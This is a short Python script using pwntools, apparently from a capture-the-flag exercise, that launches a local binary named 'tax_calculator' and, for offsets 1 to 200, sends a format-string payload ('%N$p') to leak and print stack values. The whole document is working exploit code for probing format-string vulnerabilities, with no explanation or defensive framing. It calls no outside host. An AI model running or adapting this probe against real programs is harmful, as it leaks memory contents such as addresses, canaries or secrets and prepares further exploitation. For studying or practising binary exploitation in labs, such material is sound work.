from pwn import *

elf = context.binary = ELF('./tax_calculator')
context.log_level = 'error'

for i in range(1, 201):
    try:
        p = process()

        p.sendlineafter(': ', "%{}$p|".rjust(64, 'A').format(i).encode())
        p.recvuntil('You entered: ')
        print(str(i) + ': ' + p.recvall().decode().strip('\n'))

        p.close()

    except EOFError:
        pass
